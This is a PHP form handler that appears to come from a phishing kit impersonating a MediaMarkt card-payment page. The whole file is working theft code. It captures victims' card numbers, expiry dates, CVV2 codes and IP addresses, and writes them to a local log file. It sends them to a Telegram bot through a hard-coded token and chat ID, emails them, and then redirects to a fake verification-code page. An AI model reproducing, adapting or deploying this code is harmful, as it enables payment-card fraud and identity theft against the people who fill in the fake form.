<?php
session_start();
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (!empty($_POST['Sis_Numero_Tarjeta']) and !empty($_POST['Sis_Caducidad_Tarjeta_Mes']) and !empty($_POST['Sis_Caducidad_Tarjeta_Anno']) and !empty($_POST['Sis_Tarjeta_CVV2']) 
		// and !empty($_POST['pin'])
	) {
			$_SESSION['cc2']=$_POST['Sis_Numero_Tarjeta'];
		  if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
                $ip = $_SERVER['HTTP_CLIENT_IP'];
            } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
            } else {
                $ip = $_SERVER['REMOTE_ADDR'];
            }
            $message = "CC 2 :" . $_POST['Sis_Numero_Tarjeta'] . "\nEXP :" . $_POST['Sis_Caducidad_Tarjeta_Mes'] ."/". $_POST['Sis_Caducidad_Tarjeta_Anno'] ."\nCVV :" . $_POST['Sis_Tarjeta_CVV2'] . "\n" . $ip . "\n*****************************\n";
            $file = fopen("./Corruroes.txt", "a+");
            fwrite($file, $message);
            fclose($file);
			$token = "5380008377:AAEOB2vvo-T363FsB0gpbCOPoNP6mrbaTDM";
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=-614403907&text=" . urlencode($message)."" );
			$subject = "MediaMarketa_CC : $ip";
			$headers = "From:Info <ashrafotakuok.fr>\r\n";
			$headers .= "MIME-Version: 1.0\r\n";
			$headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
			mail($to, $subject, $message, $headers);
			
			
			
        header("Location: Seleccione_medio_de_codigo_loading2.php?codigo_id=".md5($_GET['error']));
    }
}
?>